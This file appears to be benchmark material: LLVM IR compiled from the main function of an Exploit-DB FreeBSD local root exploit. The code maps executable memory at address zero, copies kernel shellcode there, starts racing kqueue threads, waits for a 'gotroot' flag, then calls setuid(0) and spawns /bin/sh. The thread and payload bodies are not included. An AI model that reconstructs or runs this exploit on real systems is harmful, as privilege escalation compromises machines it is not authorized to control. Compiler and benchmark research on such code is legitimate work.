; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/freebsd/local/extr_9488.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/freebsd/local/extr_9488.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32, i64 }

@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@PROT_EXEC = common dso_local global i32 0, align 4
@MAP_ANON = common dso_local global i32 0, align 4
@MAP_FIXED = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [5 x i8] c"mmap\00", align 1
@kernel_code = common dso_local global i32 0, align 4
@code_end = common dso_local global i32 0, align 4
@kq = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [7 x i8] c"kqueue\00", align 1
@do_thread = common dso_local global i64 0, align 8
@do_thread2 = common dso_local global i64 0, align 8
@timeout = common dso_local global %struct.TYPE_2__ zeroinitializer, align 8
@.str.2 = private unnamed_addr constant [21 x i8] c"waiting for root...\0A\00", align 1
@gotroot = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [35 x i8] c"failed - system patched or not MP\0A\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c"hwdp!\0A\00", align 1
@.str.5 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.6 = private unnamed_addr constant [3 x i8] c"sh\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %5 = load i32, i32* @PROT_READ, align 4
  %6 = load i32, i32* @PROT_WRITE, align 4
  %7 = or i32 %5, %6
  %8 = load i32, i32* @PROT_EXEC, align 4
  %9 = or i32 %7, %8
  %10 = load i32, i32* @MAP_ANON, align 4
  %11 = load i32, i32* @MAP_FIXED, align 4
  %12 = or i32 %10, %11
  %13 = call i64 @mmap(i32 0, i32 4096, i32 %9, i32 %12, i32 -1, i32 0)
  %14 = icmp slt i64 %13, 0
  br i1 %14, label %15, label %17

15:                                               ; preds = %0
  %16 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0))
  store i32 -1, i32* %1, align 4
  br label %51

17:                                               ; preds = %0
  %18 = call i32 @memcpy(i32 0, i32* @kernel_code, i32 trunc (i64 sdiv exact (i64 sub (i64 ptrtoint (i32* @code_end to i64), i64 ptrtoint (i32* @kernel_code to i64)), i64 4) to i32))
  %19 = call i32 (...) @kqueue()
  store i32 %19, i32* @kq, align 4
  %20 = icmp slt i32 %19, 0
  br i1 %20, label %21, label %23

21:                                               ; preds = %17
  %22 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0))
  store i32 -1, i32* %1, align 4
  br label %51

23:                                               ; preds = %17
  %24 = load i64, i64* @do_thread, align 8
  %25 = inttoptr i64 %24 to i8*
  %26 = call i32 @pthread_create(i32* %3, i32* null, i8* %25, i32* null)
  %27 = load i64, i64* @do_thread2, align 8
  %28 = inttoptr i64 %27 to i8*
  %29 = call i32 @pthread_create(i32* %4, i32* null, i8* %28, i32* null)
  store i64 0, i64* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @timeout, i32 0, i32 1), align 8
  store i32 1, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @timeout, i32 0, i32 0), align 8
  %30 = call i32 @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0))
  store i32 0, i32* %2, align 4
  br label %31

31:                                               ; preds = %40, %23
  %32 = load i32, i32* @gotroot, align 4
  %33 = icmp ne i32 %32, 0
  br i1 %33, label %38, label %34

34:                                               ; preds = %31
  %35 = load i32, i32* %2, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %2, align 4
  %37 = icmp slt i32 %35, 10000
  br label %38

38:                                               ; preds = %34, %31
  %39 = phi i1 [ false, %31 ], [ %37, %34 ]
  br i1 %39, label %40, label %42

40:                                               ; preds = %38
  %41 = call i32 @usleep(i32 100)
  br label %31

42:                                               ; preds = %38
  %43 = call i32 @setuid(i32 0)
  %44 = call i64 (...) @getuid()
  %45 = icmp ne i64 %44, 0
  br i1 %45, label %46, label %48

46:                                               ; preds = %42
  %47 = call i32 @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.3, i64 0, i64 0))
  store i32 -1, i32* %1, align 4
  br label %51

48:                                               ; preds = %42
  %49 = call i32 @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  %50 = call i32 @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i64 0, i64 0), i32* null)
  store i32 0, i32* %1, align 4
  br label %51

51:                                               ; preds = %48, %46, %21, %15
  %52 = load i32, i32* %1, align 4
  ret i32 %52
}

declare dso_local i64 @mmap(i32, i32, i32, i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @memcpy(i32, i32*, i32) #1

declare dso_local i32 @kqueue(...) #1

declare !callback !2 dso_local i32 @pthread_create(i32*, i32*, i8*, i32*) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @usleep(i32) #1

declare dso_local i32 @setuid(i32) #1

declare dso_local i64 @getuid(...) #1

declare dso_local i32 @execl(i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
!2 = !{!3}
!3 = !{i64 2, i64 3, i1 false}
